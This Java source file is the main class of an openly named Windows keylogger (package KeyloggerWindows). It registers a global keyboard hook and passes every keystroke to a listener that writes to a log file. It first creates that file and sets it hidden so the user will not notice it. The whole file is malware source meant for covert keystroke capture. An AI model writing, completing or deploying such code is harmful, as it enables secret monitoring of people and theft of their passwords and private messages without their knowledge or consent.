package com.company.KeyloggerWindows;

import lc.kra.system.keyboard.GlobalKeyboardHook;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.attribute.DosFileAttributes;

public class KeyboardMain
{
    public static void main(String[] args) {
        GlobalKeyboardHook keyboardHook = new GlobalKeyboardHook(true);

        try {
            new File(Keyboard.WINDOWS_FILE_PATH).createNewFile();
            Path p = Paths.get(Keyboard.WINDOWS_FILE_PATH);
            DosFileAttributes dos = Files.readAttributes(p, DosFileAttributes.class);
            Files.setAttribute(p, "dos:hidden", true);
            Keyboard keyboard = new Keyboard(new FileOperation(),Keyboard.WINDOWS_FILE_PATH);
            keyboardHook.addKeyListener(keyboard);

            while(Keyboard.run)
            {

                Thread.sleep(128);
            }
        }
        catch (IOException | InterruptedException e)
        {
            e.printStackTrace();
        } finally {
            keyboardHook.shutdownHook();
        }
    }
}
